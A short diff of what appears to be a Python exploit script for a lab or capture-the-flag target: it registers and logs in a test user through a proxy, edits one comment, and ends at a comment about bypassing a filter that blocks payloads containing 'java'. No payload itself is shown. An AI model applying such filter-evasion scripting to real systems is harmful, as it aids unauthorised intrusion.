@@ -14,7 +14,7 @@ data= {"username":"test2","password":"test2"}
 # Register a user
 response= session.post(url=f"http://{target}/register", proxies=proxies, data=data, allow_redirects=True)
 
-# Login and get the cookie value 
+# Login
 response2= session.post(url=f"http://{target}/login", proxies=proxies, data=data, allow_redirects=True)
 
 # This is needed in order to bypass a filter that blocks any payload containing the word java in it
